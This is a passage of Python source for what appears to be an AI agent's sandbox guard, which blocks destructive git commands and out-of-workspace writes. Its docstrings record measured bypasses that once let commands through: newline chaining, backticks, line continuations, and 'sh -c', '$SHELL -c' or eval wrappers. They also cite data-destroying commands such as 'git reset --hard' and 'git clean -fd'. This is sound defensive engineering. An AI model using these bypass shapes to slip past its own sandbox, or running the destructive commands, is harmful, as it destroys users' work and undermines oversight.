        if tok in ("--file", "-f"):
            # A flag is never a file *name*: `--file --global` is a malformed
            # spelling, and naming `--global` as the path it writes would put a
            # flag in the refusal — the same "an operator is never a target"
            # discipline the redirect walk applies to `> (issue #1268).
            if j + 1 < len(rest) and not rest[j + 1].startswith("-"):
                return [rest[j + 1]]
            return []
        if tok.startswith("--file="):
            value = tok.split("=", 1)[1]
            return [value] if value else []
        if tok.startswith("-f") and len(tok) > 2:
            return [tok[2:]]
    if "--global" in rest:
        return ["~/.gitconfig"]
    if "--system" in rest:
        return ["/etc/gitconfig"]
    return []                           # `--local` is the repo's own .git/config


def _protected_paths() -> list[str]:
    """Canonicalized (realpath) protected daemon state files."""
    out: list[str] = []
    for p in _PROTECTED_FILES:
        try:
            out.append(os.path.realpath(os.path.expanduser(p)))
        except OSError:
            pass
    return out


def _trusted_write_zones() -> list[str]:
    """Canonicalized write roots that a ``workspace-write`` session may target.

    These are trusted alongside the injected workspace root and the OS temp
    area — targets inside them are never blocked by the ``workspace-write``
    boundary:

    - ``~/.emrg/evolution/.emrg/`` — the evolution module's own data root
      (cycle records under ``memory/``, ``sessions/`` scratch). The evolution
      task runs at ``workspace-write`` with ``workspace`` = the repo checkout
      (``~/.emrg/evolution/emrg``), so its own record writes to
      ``~/.emrg/evolution/.emrg/memory/*.md`` fall OUTSIDE ``workspace`` and
      would be blocked — a self-regression from PR #1092 (issue #1093). Trust
      this root like the daemon's own ``~/.emrg`` state, so the evolution
      module can still record its history.
    """
    out: list[str] = []
    evo_data = os.path.expanduser("~/.emrg/evolution/.emrg")
    try:
        out.append(os.path.realpath(evo_data))
    except OSError:
        pass
    return out


def _temp_write_roots() -> set[str]:
    r"""Canonicalized OS-temp write roots, normalized for the ``Temp\<suffix>``
    discrepancy (issue #1093 proposal #3).

    ``tempfile.gettempdir()`` may return ``C:\\...\\AppData\\Local\\Temp\\2``
    (8.3 short name + ``\\2`` suffix) on Windows, while helpers/scripts are
    written to the plain ``...\\Temp\\`` root. When ``gettempdir()`` points at
    a ``Temp``-named parent with a suffix child, also trust the parent ``Temp``
    root so both spellings are allowed.
    """
    roots: set[str] = set()
    t = tempfile.gettempdir()
    try:
        roots.add(os.path.realpath(t))
    except OSError:
        pass
    parent = os.path.dirname(t)
    if os.path.basename(parent).lower() == "temp":
        try:
            roots.add(os.path.realpath(parent))
        except OSError:
            pass
    return roots


def _is_absolute_path(p: str) -> bool:
    """True when ``p`` is absolute (or drive-less rooted, e.g. ``/etc/hosts``
    on Windows — ntpath.isabs returns False for those, but they still do not
    resolve under the cwd, so the sandbox must treat them as absolute).

    A drive-rooted spelling (`C:\\…`, `C:/…`) counts as absolute when the shell
    that will run the command is a Windows shell. `ntpath.isabs` already answers
    True for it there, so on that platform this arm is redundant — it is here so
    the rule does not depend on which `os.path` the *guard* happens to be
    running under, which is what makes issue #1261's branch verifiable off
    Windows. On a POSIX shell the spelling is a relative name and is left alone.
    """
    return (
        os.path.isabs(p)
        or p.startswith("/")
        or p.startswith("\\")
        or bool(_WINDOWS_SHELL and _WINDOWS_DRIVE_RE.match(p))
    )


def _is_within(path: str, root: str) -> bool:
    """True when ``path`` (absolute) is inside ``root`` (absolute) or equals it.

    Under a Windows shell the comparison canonicalises the separator before the
    prefix test. That is a uniform substitution on both sides, so it cannot
    change which of two real paths contains the other — but it does stop the
    test from depending on which `os.path` (and therefore which ``os.sep``) the
    *guard* is running under, which is what makes issue #1261's containment
    verifiable off Windows. POSIX shells are untouched.
    """
    try:
        rp = os.path.realpath(path)
        rr = os.path.realpath(root)
        if _WINDOWS_SHELL:
            rp = rp.replace("\\", "/")
            rr = rr.replace("\\", "/").rstrip("/")
            return rp == rr or rp.startswith(rr + "/")
        return rp == rr or rp.startswith(rr + os.sep)
    except OSError:
        return False


def check_read_only_file_write(file_path: str, workspace: str | None = None) -> str | None:
    """Read-only sandbox check for the write/edit tools (community issue #979).

    Returns a block reason when the target file is inside the task's workspace
    (the host's working tree — protected by the structural dirty-tree guard) or
    is a protected daemon state file; returns None when allowed.

    Writes OUTSIDE the workspace (memory dir, logs, OS temp) stay allowed so a
    read-only cycle can still record state and write its own artifacts — the
    guard protects the host's uncommitted work, not the agent's own scratch
    space. Mirrors the bash tool's read-only semantics for file tools.
    """
    path = os.path.realpath(os.path.expanduser(file_path))
    if workspace:
        ws = os.path.realpath(os.path.expanduser(workspace))
        if _is_within(path, ws):
            return (
                f"read-only sandbox: blocked file write inside workspace {path!r} "
                "(dirty-tree guard, community issue #979)"
            )
    if path in _protected_paths():
        return (
            f"read-only sandbox: blocked write to protected daemon file {path!r}"
        )
    return None


def check_workspace_write(file_path: str, workspace: str | None = None) -> str | None:
    """workspace-write sandbox check for the write/edit tools (rant 2026-09-01T15:10:23).

    Returns a block reason when the target file is a protected daemon state file,
    is ``~/.emrg`` itself, or is an absolute path outside the workspace root
    (OS temp allowed — mirrors dsh's workspace + backend-promised temp area);
    returns None when allowed.

    Relative paths are assumed in-workspace (cwd = the workspace root), matching
    the bash tool's workspace-write semantics (2026-08-20T15:46:50) and dsh's
    writableRoots single-source + tool-symmetry design. Without this check the
    write/edit tools let ``workspace-write`` sessions write anywhere outside the
    session cwd, while the bash tool is correctly blocked — the asymmetric hole
    this function closes.
    """
    if not file_path:
        return None
    expanded = os.path.expanduser(file_path)
    if not _is_absolute_path(expanded):
        # Relative target: assumed in-workspace (cwd = the workspace root).
        return None
    real = os.path.realpath(expanded)
    if real in _protected_paths():
        return (
            f"workspace-write sandbox: blocked write to protected daemon file {file_path!r}"
        )
    emrg_home = os.path.realpath(os.path.expanduser("~/.emrg"))
    if real == emrg_home:
        return (
            f"workspace-write sandbox: blocked destructive write to {file_path!r} "
            "(would erase the daemon's data directory)"
        )
    workspace_real = (
        os.path.realpath(os.path.expanduser(workspace)) if workspace else None
    )
    # Allow: inside workspace, inside the OS-temp roots (normalized), or inside
    # a trusted zone (~/.emrg/evolution/.emrg — the evolution module's own data
    # root, issue #1093 self-regression). Everything else is blocked.
    allowed_srcs = [workspace_real] if workspace_real else []
    allowed_srcs += list(_trusted_write_zones())
    allowed_srcs += list(_temp_write_roots())
    if not any(
        src and (_is_within(real, src) or real == src) for src in allowed_srcs
    ):
        return (
            f"workspace-write sandbox: blocked write outside workspace {file_path!r}"
        )
    return None


def _tokenize_command(cmd: str) -> list[str]:
    """Split a shell command into tokens, preserving operators like ``&&``.

    Uses ``shlex`` so quoting is respected: a mutator mentioned inside a string
    literal is one token, not a command word — which is what stops the guard
    from refusing a command that merely *talks about* `git merge` (issue #1156
    facet D). Falls back to a whitespace split when the input is unparseable
    (an unterminated quote), because a guard that crashes on odd input is worse
    than one that over-blocks it.

    ⚠️ The punctuation set is explicit and **includes the backtick**. `shlex`'s
    default punctuation set is `();<>|&` — it omits `` ` ``, so a command
    substitution stayed glued to its words: `` `git checkout .` `` tokenised as
    `` ['`git', 'checkout', '.`'] `` and the program word never matched `git`.
    Measured against master 2026-09-12 (`cyc20260912-190602`): the raw-text guard
    blocked all four backtick shapes and this parsed guard allowed all four —
    an under-block in the destructive direction, introduced by the same
    migration that fixed the over-blocks. `$( … )` was unaffected because its
    `git` is already a separate token, which is what made the hole invisible to
    the substitutions that were covered.

    ⚠️ **Newline is a separator, and it had to be added in two places.** The
    sets (`_COMMAND_SEPARATORS`, `_SHELL_SEPARATORS`) have always listed `"\n"`,
    but `shlex` never emitted it: a newline was *whitespace*, so it vanished and
    glued the two lines' tokens into one stream. `_runs_as_a_command` then
    looked left past the second command and found the first command's operand —
    not a separator — and answered "data, not an invocation". Measured on master
    `addcb5ee` in the `read-only` tier: `git stash drop` blocked,
    `git stash drop; echo done` blocked, and `echo done` + newline +
    `git stash drop` **allowed**. That is the 2026-08-20 data-loss class this
    tier exists to make structurally impossible, reachable by pressing Enter.
    `git config user.name x`, `git clean -fd` and `git checkout .` behind any
    read behaved the same.

    ⚠️ The write-target extractor (`_extract_write_targets`, the other
    tokenizer) is **not** affected, and I checked rather than assumed: it walks
    tokens matching *command words* (`rm`, `mv`, `tee`) wherever they sit, so it
    needs no separator and already found `rm -rf /tmp/a` at the end of a
    newline-separated line (11 destructive shapes measured, 0 differing between
    bare, `;`-chained and newline-chained). The hole is specific to the
    position-sensitive walk in `_runs_as_a_command` — which is exactly the walk
    that decides whether a `git` token is an invocation at all.

    Fix: put `\n` in the punctuation set (so it becomes its own token) **and**
    take it out of `lex.whitespace` (otherwise the whitespace branch still
    splits on it and it is never emitted as a token). A newline *inside* quotes
    is unaffected — quoting is resolved before either rule — so
    ``echo "a<newline>b"`` stays one argument, as the shell makes it.
    """
    cmd = _protect_windows_backslashes(_strip_line_continuations(cmd))
    try:
        lex = _shell_lexer(cmd, _PUNCTUATION_CHARS)
        lex.whitespace_split = True
        # `\n` is a separator token, not whitespace to be discarded — see above.
        lex.whitespace = " \t\r"
        return _restore_windows_backslashes(_unfuse_newlines(list(lex)))
    except ValueError:
        return _restore_windows_backslashes(cmd.split())


# The punctuation set handed to `shlex` above. Adjacent characters in this set
# are fused into ONE token, which is the whole reason `_unfuse_newlines` exists.
_PUNCTUATION_CHARS = "();<>|&`\n"


def _unfuse_newlines(tokens: list[str]) -> list[str]:
    """Emit each newline as its own token when `punctuation_chars` fused it in.

    Making `\n` punctuation was necessary but not sufficient (#1233): shlex
    groups *adjacent* punctuation into a single token, so `echo a;` followed by
    a newline arrives as ``";\n"``, a blank line as ``"\n\n"``, and `cmd &&`
    followed by a newline as ``"&&\n"``. None of those is `in
    _COMMAND_SEPARATORS`, so the position-sensitive walks answered "data, not an
    invocation" — the hole #1233 closed for a bare newline, open again one
    character later. Measured on master `e6eaaee4`, `read-only` tier: 40 shapes
    ALLOWED that block when the same writer is written inline — 5 writers
    (`git stash drop`, `git checkout .`, `git clean -fd`, `git config user.name
    x`, `git reset --hard`) × 8 fused forms (a blank line, two blank lines,
    ``";\n"``, ``"\n;"``, ``"&&\n"``, ``"\n&&"``, ``"|\n"``, ``"\n(\n"``).
    Five of those 8 forms are shapes a shell really runs the writer in (measured
    against both `/bin/sh` and `/bin/bash` with a side-effect probe); the other
    three — ``"\n;"``, ``"\n&&"``, ``"\n(\n"`` — are parse errors in both, so
    closing them is conservative rather than necessary, and 25 of the 40 are
    shapes whose writer a shell executes.

    Only tokens that are *entirely punctuation* are split, and that is exactly
    what separates a fused run from a word: ``echo "a<newline>b"`` is one
    argument to the shell, shlex hands it over as one token containing letters,
    and it is left alone. The other punctuation runs are left alone too, which
    matters — `_extract_write_targets` matches a redirect *operator* by spelling,
    so splitting ``">>\n"`` into ``">"``, ``">"`` would name the second `>` as the
    target instead of the file.
    """
    if not any("\n" in tok and tok != "\n" for tok in tokens):
        return tokens
    out: list[str] = []
    for tok in tokens:
        if tok != "\n" and "\n" in tok and all(c in _PUNCTUATION_CHARS for c in tok):
            out.extend(p for p in re.split(r"(\n)", tok) if p)
        else:
            out.append(tok)
    return out


def _strip_line_continuations(cmd: str) -> str:
    """Remove every backslash-newline the shell removes before it parses.

    A backslash immediately followed by a newline is a **line continuation**: the
    shell deletes both characters and joins the lines, so the two lines are ONE
    command and nothing separates them. Left in place, `shlex` glues the newline
    to the *next word*, so the command word stops being a token at all. Measured
    on master `e6eaaee4`, `read-only` tier: `x=1 \\<newline>git checkout .`
    tokenises to ``['x=1', '\\ngit', 'checkout', '.']`` — there is no ``git``
    token — and the shell runs ``git checkout .`` in both ``/bin/sh`` and
    ``/bin/bash``. Three spellings reach that way (bare, after an assignment,
    after a separator) and all three are ALLOW on master.

    Removing it is not a heuristic: it is exactly what the shell does, so it
    cannot hide a command the shell would run. It also keeps the *mention* case
    honest — ``echo done \\<newline>git checkout .`` joins into a single
    ``echo`` whose ``git`` is an argument, and both the shell and the guard read
    it that way.

    Two things are easy to get wrong, and both are measured:

    * **A CR is not a newline.** `\\<CR><LF>` is `\\` escaping the CR, then a
      CRLF line break — *two commands*, the second one real (measured: the shell
      runs the mutator after it). Only `\\<LF>` is a continuation, so the CR is
      left to the escape-pair rule below and the LF stays a separator.
    * **An escaped backslash ends the story.** ````echo a\\<newline>git checkout
      .```` is not a continuation: the shell consumes the two backslashes as
      literal pairs, so the newline is a **real separator** and the mutator runs.
      Pairing a backslash with the newline without first asking whether it was
      itself escaped deletes that separator and lets the leftover backslash
      escape the first letter of the next word, so the command word stops being a
      token at all — the same failure this function exists to prevent, one
      character deeper. Escapes are therefore consumed as **pairs**.
    * **A quoted apostrophe is data.** In ````echo "x'" ; a=1 \\<newline>git
      checkout .```` the `'` sits inside double quotes, so it does not open a
      single-quoted string and the continuation is real. Tracking `'` alone
      missed it; `"` is tracked as a second state, and the strip runs inside
      double quotes because the shell removes the continuation there too.
    """
    if "\\\n" not in cmd and "\\\r\n" not in cmd:
        return cmd
    out: list[str] = []
    in_single = False
    in_double = False
    i = 0
    while i < len(cmd):
        ch = cmd[i]
        if ch == "'" and not in_double:
            in_single = not in_single
        elif ch == '"' and not in_single:
            in_double = not in_double
        elif ch == "\\" and not in_single:
            j = i + 1
            if cmd[j:j + 1] == "\n":
                i = j + 1
                continue
            # A backslash escapes the next character, so the two are consumed
            # together: an escaped backslash is never itself paired with the
            # newline that follows it (clause A).
            out.append(ch)
            if j < len(cmd):
                out.append(cmd[j])
                i = j + 1
            else:
                i = j
            continue
        out.append(ch)
        i += 1
    return "".join(out)


def _runs_as_a_command(tokens: list[str], i: int) -> bool:
    """Whether ``tokens[i]`` is in *command position* — i.e. the shell will run it.

    This is the difference between an invocation and an argument, and it is the
    whole reason a parser is used here rather than a scan: `grep -rn git .` and
    `git status` both contain the token `git`, but only the second runs it.

    A token is in command position when:
      * it is first in the stream, or
      * the token before it is a **command separator** (`&&`, `||`, `;`, `|`,
        `&`, newline), a grouping/negation operator (`(`, `{`, `!`), or
      * the tokens before it are **command wrappers** and their options/values
        (`env`, `sudo`, `xargs`, `nohup`, `time`, `timeout`, `nice`, `doas`,
        `setsid`, `stdbuf`, `command`, …), or
      * the token before it is a `VAR=value` environment assignment
        (`FOO=1 git checkout .` really does run git).

    ⚠️ The wrapper case must keep working, and it needs the flag's **value**
    skipped, not just the flag. The obvious fix for the over-block — "only
    position 0 can be an invocation" — would under-block every wrapper prefix,
    and `env git checkout .` genuinely destroys uncommitted work; a first attempt
    that skipped only flags left `sudo -u root git checkout .`, `timeout 5 git
    checkout .`, `nice -n 5 git checkout .`, `xargs -I{} git checkout .` and
    `stdbuf -o0 git checkout .` all allowed (5 of 44 mutator shapes, measured).
    So a non-flag token that follows a flag is treated as that flag's value and
    skipped.

    That value-test is an **over-approximation**, deliberately: whether a flag
    takes a value is a per-command fact, and enumerating which flags do is the
    same enumeration trap that made the wrapper's `-c` walk unsound. The cost is
    that `xargs -I{} grep git` — where `grep` is the command and `git` its
    argument — is read as a wrapper invocation and blocked. That is a false block
    in the harmless direction, and it is the trade this guard always makes: a
    refused command is loud, and silent data loss is not.
    """
    j = i - 1
    while j >= 0:
        tok = tokens[j]
        if tok in _SHELL_SEPARATORS or tok in _COMMAND_POSITION_OPERATORS:
            return True
        if tok in _SHELL_KEYWORD_POSITION:
            return True
        if _is_env_assignment(tok):
            j -= 1
            continue
        if _basename(tok) in _COMMAND_WRAPPERS:
            # The candidate is this wrapper's command argument.
            return True
        if tok.startswith("-"):
            j -= 1
            continue
        # A non-flag token: it belongs to a prefix (a flag's value, or a
        # wrapper's own argument) when the token before it is a flag or a
        # wrapper. Otherwise it is a command word and the candidate is one of
        # its arguments — data, not an invocation.
        if j - 1 >= 0:
            left = tokens[j - 1]
            if left.startswith("-"):
                j -= 2
                continue
            if _basename(left) in _COMMAND_WRAPPERS:
                return True
        return False
    return True


def _git_verbs(tokens: list[str]) -> list[tuple[str, list[str]]]:
    """Resolve every ``git`` invocation in a token stream to ``(verb, rest)``.

    Walks the token stream, and at each ``git`` token skips git's *global*
    options to find the resolved verb (issue #1156: a global option sits
    exactly where a raw-text regex expects the subcommand). Returns one entry
    per invocation, so a chained command is judged by all of its invocations.

    ⚠️ Only a ``git`` token in **command position** is an invocation
    (`_runs_as_a_command`). Treating every `git` token as one over-blocked any
    command that merely *names* git as an argument — `grep -rn git .` was read
    as the invocation `git .`, and the fail-closed default then refused a plain
    search (measured against master 2026-09-12: 9 of 30 read shapes regressed,
    all in that class). The quoted-mention case was already handled because
    tokenising keeps a string literal whole; the *unquoted argument* is the same
    defect one level down, and position is what distinguishes it.

    ``rest`` is the tokens after the verb **up to the next command separator**,
    needed to decide flag/subcommand-dependent verbs (`git branch -D` writes,
    `git branch -a` reads).

    Bounded, because it once was not: an unbounded ``rest`` handed the *next*
    command's tokens to a verdict that decides on the positional count, so
    `git config user.name && git config user.email` — the identity check every
    cycle is told to run (`emrg/server/evolution_prompt.md`) — was read as
    `git config` with four positionals and refused as a mutation, while the same
    command alone was allowed. The shape affects every positional-count-decided
    verb (`config`, `tag`, `branch`, `remote`, `submodule`, `worktree`).
    """
    out: list[tuple[str, list[str]]] = []
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if _basename(tok) != "git" or not _runs_as_a_command(tokens, i):
            i += 1
            continue
        inv = _git_invocation_at(tokens, i)
        if inv is None:
            i += 1
            continue
        j, verb, rest = inv
        out.append((verb, rest))
        i = j + 1
    return out


def _git_invocation_at(tokens: list[str], i: int) -> tuple[int, str, list[str]] | None:
    """``(verb token index, verb, tokens after it)`` for the ``git`` at ``i``.

    The global-option skip that finds a git subcommand lives here rather than
    inline in `_git_verbs`, because a second caller needs the same answer: the
    write-target walk has to know *which verb* a `git` token introduced before it
    can read that verb's file operand (`_git_config_write_targets`). Two copies
    of the walk would be two places to fix the day git adds another option that
    takes a value — exactly the drift the shared helpers in this file exist to
    prevent.

    Returns ``None`` when the invocation has no verb to resolve: a bare trailing
    ``git``, or one followed only by global options.
    """
    j = i + 1
    # Skip global options (and the separate value of options that take one).
    while j < len(tokens):
        nxt = tokens[j]
        if nxt in _GIT_GLOBAL_WITH_VALUE:
            j += 2
            continue
        if nxt.startswith("-"):
            j += 1
            continue
        break
    if j >= len(tokens):
        return None
    end = j + 1
    while end < len(tokens) and tokens[end] not in _COMMAND_SEPARATORS:
        end += 1
    return j, tokens[j], tokens[j + 1:end]


def _git_invocation_is_mutator(verb: str, rest: list[str]) -> str | None:
    """Classify one resolved git invocation. Returns the offending verb, or None.

    **Fail-closed**: a verb is allowed only when it is known to print
    information. Anything else — an unlisted verb, and therefore every
    subcommand git adds in future — blocks. The blocklist this replaced had the
    default inverted, which made the safe set the *unlisted* one; with 169
    subcommands that can never be enumerated, that is a guard against only the
    names someone happened to type.

    The decision is on the *effect*, not the spelling: read-only inspections
    (`git stash list`, `git worktree list`, `git submodule status`,
    `git branch -a`, `git remote -v`, `git config -l`) are read from the
    resolved verb + flags, so they stay allowed without an exemption pattern to
    keep in sync.
    """
    if verb in _GIT_READ_VERBS:
        return None
    if verb in _GIT_SHAPE_DECIDED:
        return _shape_decided_verdict(verb, rest)
    # Unlisted verb: block. This is the fail-closed default and the whole point
    # of the design — `checkout-index`, `mktree`, `filter-branch`, `init`,
    # `clone`, `revert`, and any future subcommand land here.
    return verb


def _flag_part(tok: str) -> str:
    """The spelling a flag table should be asked about, for ``tok``.

    A flag and its value may be written as one token or two, and the tables hold
    the flag. Comparing whole tokens therefore decides by *spelling* while
    claiming to decide by flag: measured 2026-09-16 against master, read-only
    ALLOWED `git branch --set-upstream-to=origin/main` and `git branch
    -uorigin/main` (both really did set the upstream) while the two-token forms
    `--set-upstream-to origin/main` / `-u origin/main` were BLOCKED — the same
    write, three spellings, two verdicts. `git branch -dold` is refused by git
    itself (rc=129), so widening here can only over-block a shape git rejects.

    Only a leading flag is rewritten: `-` alone is a filename, ``--`` alone is
    the argument terminator, and a short option keeps its first letter (`-u`),
    which is how git reads it too. Nothing else about the token is touched, so
    a path or a pattern is still compared as written.
    """
    if not tok.startswith("-") or tok in ("-", "--"):
        return tok
    if tok.startswith("--"):
        return tok.split("=", 1)[0]
    return tok[:2]


def _git_positionals(rest: list[str],
                     extra_value_opts: frozenset[str] = frozenset()) -> list[str]:
    """The non-option arguments of a git subcommand, option *values* excluded.

    The same walk as the invocation splitter's global-option skip, one level
    down: an option that takes a separate value consumes the next token, so
    `["--ref", "refs/notes/x", "list"]` yields `["list"]` instead of
    `["refs/notes/x", "list"]`. A value is never a subcommand, and treating one
    as a subcommand is how `git reflog -n 5` was refused as a mutator (#1240).

    `extra_value_opts` is for a verb whose own options are not in the shared set
    — `git config --file <p>` is the measured case (#1273): the shared set holds
    the options that decide a *subcommand*, while this one decides a *verdict*.
    """
    value_opts = _GIT_SUBCOMMAND_WITH_VALUE | extra_value_opts
    out: list[str] = []
    i = 0
    while i < len(rest):
        tok = rest[i]
        if tok in value_opts:
            i += 2
            continue
        if tok.startswith("-"):
            i += 1
            continue
        out.append(tok)
        i += 1
    return out


def _shape_decided_verdict(verb: str, rest: list[str]) -> str | None:
    """The verdict for a verb whose subcommand / flags decide its effect.

    Returns the verb when the invocation writes, or None when it is a proven
    read. Every branch treats "not recognisably a read" as a write.
    """
    # Two independent readings of the same token list, and both are needed:
    # `_git_positionals` skips an option's *value* (so `git reflog -n 5` reads
    # `5` as neither a subcommand nor a positional — issue #1240), while `flags`
    # compares each option by its part, so an attached value cannot hide a flag
    # (issue #1256). Taking either one alone re-opens the other's defect.
    positional = _git_positionals(rest)
    flags = [_flag_part(t) for t in rest]
    sub = next(iter(positional), None)
    if verb == "stash":
        # `stash list` / `stash show` read; a bare `git stash` saves and cleans
        # the tree, so it writes.
        return None if sub in ("list", "show") else verb
    if verb == "worktree":
        # `worktree list` reads; a bare `git worktree` only prints usage.
        return None if sub is None or sub == "list" else verb
    if verb == "submodule":
        # `submodule status` / `summary` read; a bare `git submodule` only
        # prints usage.
        return None if sub is None or sub in ("status", "summary") else verb
    if verb == "remote":
        # `remote -v` / `show` / `get-url` read; `set-url`/`add`/`remove` write.
        return None if sub is None or sub in ("show", "get-url", "v") else verb
    if verb in ("branch", "tag"):
        # A listing flag makes this a read even with a pattern argument; a
        # delete/force/move flag makes it a write. Both tests ask `flags`, not
        # `rest`, so an attached value (`--delete=old`, `-uorigin/main`) is the
        # same flag as the two-token form.
        if any(t in _GIT_WRITE_FLAGS for t in flags):
            return verb
        if any(t in _GIT_LIST_FLAGS for t in flags):
            return None
        # `git branch <name>` / `git tag <name>` create; only the bare form
        # (no positional argument at all) is the listing read.
        return None if not positional else verb
    if verb == "config":
        if any(t in _GIT_CONFIG_WRITE_FLAGS for t in rest):
            return verb
        if any(t in _GIT_CONFIG_READ_FLAGS for t in rest):
            return None
        # git 2.46+ spells the same operations as subcommands (`git config unset
        # k`); the first positional decides which, and only a word that is one of
        # them counts — a config key is not a subcommand.
        #
        # This verb's own value-taking options are walked out first (#1273): the
        # shared set holds the options that decide a *subcommand*, so `--file
        # <p>` left `<p>` among the positionals and the count then read a pure
        # read (`git config --file <p> user.name`, measured: rc=1, nothing
        # written) as the write it is one token away from.
        positional = _git_positionals(rest, _GIT_CONFIG_VALUE_OPTS)
        subcommand = next(iter(positional), None)
        if subcommand in _GIT_CONFIG_WRITE_SUBCOMMANDS:
            return verb
        if subcommand in _GIT_CONFIG_READ_SUBCOMMANDS:
            return None
        # `git config <key>` with no value is a read; `key=value` writes. A lone
        # positional key is ambiguous, so treat a single positional as a read and
        # anything that looks like an assignment as a write.
        if any("=" in t for t in positional):
            return verb
        return None if len(positional) <= 1 else verb
    if verb == "interpret-trailers":
        # Prints to stdout by default; `--in-place` rewrites its file operand
        # in place — the same effect as `sed -i`, which read-only blocks.
        return verb if "--in-place" in rest else None
    if verb == "credential":
        # `fill` / `get` read; `approve` / `reject` write the credential store.
        return None if sub in ("fill", "get") else verb
    if verb == "hash-object":
        # `git hash-object <file>` computes and prints an object name — a read.
        # `-w` additionally writes the object into the database.
        return verb if "-w" in rest else None
    if verb == "reflog":
        # Bare `git reflog` is `reflog show` — it prints. `expire` / `delete` /
        # `drop` rewrite the reflog, so they stay blocked, as does any
        # subcommand git adds later (fail-closed).
        return None if sub in (None, "show", "list", "exists") else verb
    if verb == "notes":
        # `list` / `show` print; `add` / `copy` / `append` / `edit` / `remove` /
        # `prune` write the notes ref. Bare `git notes` prints the note list.
        return None if sub in (None, "list", "show") else verb
    if verb == "bisect":
        # Only the pure reporters. `start` / `good` / `bad` / `skip` / `reset` /
        # `run` write `.git/BISECT_*`, and `replay` can rewrite history.
        return None if sub in ("log", "view", "visualize") else verb
    return verb


def _is_env_assignment(tok: str) -> bool:
    """Whether ``tok`` is a shell variable assignment (`FOO=1`, `PATH=/x:$PATH`).

    Distinguished from a command word so `FOO=1 git checkout .` still reads as a
    git invocation: the shell strips leading assignments and runs what follows.
    """
    return bool(_ENV_ASSIGNMENT_RE.match(tok))


def _basename(tok: str) -> str:
    """The command word without its directory prefix or extension.

    `/usr/bin/git` and `git.exe` name the same program as `git`; a guard that
    only recognises the bare spelling is a guard against the polite form of
    the command. (On Windows the shell resolves `git` to `git.exe`, so the
    extension form is the one that actually runs there.)

    A leading `VAR=` is stripped for the same reason: `FOO=1 git checkout .`
    runs git, and the assignment is not part of the program word. Command
    substitution used to need stripping here too, and does not any more — the
    tokenizer now splits on the backtick, which is the *structural* fix; keeping
    a strip here as well would have hidden the fact that the token stream was
    wrong, and would only have covered the substitutions that happen to wrap the
    program word rather than the shape.
    """
    base = tok.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    if base.lower().endswith(".exe"):
        base = base[:-4]
    if "=" in base:
        head, _, tail = base.partition("=")
        if head.isidentifier():
            base = tail
    return base


def _nested_command_texts(tokens: list[str]) -> list[str]:
    """The command strings a shell will itself re-parse out of ``tokens``.

    Returns the argument of every `sh -c <text>` (and the other wrapper
    shells) and every `eval <text>`, so the caller can recurse into them.

    Why this is needed rather than optional: tokenising splits a command into
    an outer invocation plus an opaque string literal, and a string literal is
    data. `sh -c 'git checkout .'` therefore parses as the command `sh` with a
    quoted payload — no git invocation at all. The pre-parsing guard blocked
    it, because a raw-text regex over the whole line did not care where the
    word sat. Dropping that scan silently made 5 wrapper shapes writable under
    read-only (measured 2026-09-12 against master: `sh -c` / `bash -c` /
    `zsh -c` / `dash -c` / `eval` all went from blocked to allowed), which is
    the one direction this guard must never move in. So the parsed design has
    to model the nesting explicitly.

    The wrapper is recognised by its *name*, and then **every remaining token
    is treated as a possible payload** — the same over-approximation `eval`
    already gets. Locating the `-c` flag instead looks tighter but is unsound:
    it requires enumerating how a flag may be spelled, and the enumeration is
    always incomplete. Measured 2026-09-12 against the first version of this
    function, which walked to `-c`:

      - short forms worked (`bash -c`, `bash -lc`, `bash -x -c`);
      - but a **long option** or an **option value** ended the walk before
        `-c` was ever reached, so `bash --login -c 'git checkout .'`,
        `bash --noprofile -c ...`, `bash --posix -c ...`, `bash -o pipefail
        -c ...` and `zsh --login -c ...` were all ALLOWED under read-only —
        9 of 14 wrapper shapes, every one of them a mutator. Driven end to
        end through `BashTool.execute`, 3 of 4 destroyed uncommitted work
        that master blocks.
      - this is the #461 class exactly: matching one spelling of a class while
        the other spelling passes. A guard cannot win that enumeration, so it
        must not depend on it.

    Over-approximating costs only that a wrapper followed by a non-command
    (e.g. `bash script.sh`) recurses into a filename, which parses to no git
    invocation and stays allowed. Erring toward *blocking* is the safe
    direction for this guard; erring toward data loss is not.

    An **un-resolvable** wrapper is treated the same way (issue #1244): a
    program word that is a variable reference may well be the shell, and the
    guard cannot tell — measured on master, `$SHELL -c 'git checkout .'`,
    `${SHELL} -c …`, `"$SHELL" -c …`, `env FOO=1 $SHELL -c …` and
    `sudo $SHELL -c …` all answered ALLOW at read-only and all discarded the
    uncommitted edit. Its payload is therefore read as a possible command, which
    only ever *adds* blocking — the walk stays monotone in the safe direction.
    """
    out: list[str] = []
    for i, tok in enumerate(tokens):
        if _basename(tok) in _SHELL_WRAPPERS:
            # `sh -c <text>` — take everything after the wrapper and let the
            # recursive parse decide what is a command. Do NOT locate `-c`:
            # every way of spelling an option before it is a hole.
            out.extend(tokens[i + 1:])
        elif _basename(tok) in _SHELL_EVALUATORS:
            # `eval <text...>`: every remaining token is re-parsed as a command.
            out.extend(tokens[i + 1:])
    out.extend(_unresolved_wrapper_payloads(tokens))
    return out


def _operand_names_stdin(args: list[str]) -> bool:
    """Whether ``args`` name stdin as a message reader's input file.

    Two spellings, both measured on git 2.50.1: the value as its own token
    (`-F -`, `--file -`) and attached (`-F-`, `--file=-`). `-F=-` is not one of
    them — git opens the file ``=-`` and fails — so it is not counted, and a
    `-F`/`--file` whose value is anything else is a real filename.
    """
    for i, arg in enumerate(args):
        if arg in _STDIN_OPERAND_ATTACHED:
            return True
        if arg in _STDIN_OPERAND_SEPARATE and i + 1 < len(args) and args[i + 1] == "-":
            return True
    return False


def _owns_stdin_as_data(prefix: list[str]) -> bool:
    """Whether this simple command reads the heredoc on its stdin as data.

    ``prefix`` is the raw token span before the ``<<`` opener, env assignments
    included: the shell strips those before running the command, so they are not
    part of the command word — but an env prefix is also how `GIT_CONFIG_COUNT`
    / `GIT_CONFIG_KEY_0` / `GIT_CONFIG_VALUE_0` reaches a tool, and the guard
    reads text, so it cannot tell those assignments from a harmless `FOO=1`. An
    env prefix therefore forfeits the mask, which is the fail-closed direction.

    Beyond that: a named data reader owns its stdin whatever the arguments, and
    a message reader owns it only in the invocation that says so — the tool, its
    subcommand, and a stdin operand, with the subcommand read at argv[0] after
    the tool so that no global option can stand between them.
    """
    words = [tok for tok in prefix if not _is_env_assignment(tok)]
    if not words:
        return False
    if _basename(words[0]) in _DATA_READER_CONSUMERS:
        return True
    subs = _STDIN_MESSAGE_READERS.get(_basename(words[0]))
    if subs is None:
        return False
